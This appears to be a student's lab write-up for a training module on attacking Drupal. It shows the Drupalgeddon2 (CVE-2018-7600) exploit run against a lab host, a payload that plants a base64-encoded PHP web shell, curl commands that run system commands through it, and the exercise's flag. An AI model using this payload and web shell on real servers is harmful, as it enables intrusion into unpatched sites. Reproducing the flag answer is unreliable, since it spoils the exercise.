# Section 08: Attacking Drupal

Module: 24. Attacking Common Applications

---

## Questions & Answers

### 1. Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.

Context:
- I used the **Drupalgeddon2** exploit [exploit script](https://www.exploit-db.com/exploits/44448):
```bash
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-znmmfatrjw-htb-cloud-com]─[~]
└──╼ [★]$ python3 ./drupalexploit.py 
################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-znmmfatrjw-htb-cloud-com]─[~]
└──╼ [★]$ curl http://drupal-dev.inlanefreight.local/hello.txt
;-)
```
- Construct the payload to get the shell:
```python
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php'}
```
- Exploit again then confirm RCE and get the flag:
```bash
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-znmmfatrjw-htb-cloud-com]─[~]
└──╼ [★]$ python3 ./drupalexploit.py 
################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-znmmfatrjw-htb-cloud-com]─[~]
└──╼ [★]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-znmmfatrjw-htb-cloud-com]─[~]
└──╼ [★]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=cat%20/var/www/drupal.inlanefreight.local/flag.txt
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-znmmfatrjw-htb-cloud-com]─[~]
└──╼ [★]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=ls%20/var/www/drupal.inlanefreight.local
INSTALL.txt
LICENSE.txt
README.txt
autoload.php
composer.json
composer.lock
core
example.gitignore
flag_6470e394cbf6dab6a91682cc8585059b.txt
index.php
modules
profiles
robots.txt
sites
themes
update.php
vendor
web.config
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-znmmfatrjw-htb-cloud-com]─[~]
└──╼ [★]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=cat%20/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
DrUp@l_drUp@l_3veryWh3Re!
```

**Answer:** `DrUp@l_drUp@l_3veryWh3Re!`

---

[Back to Module Index](./README.md)
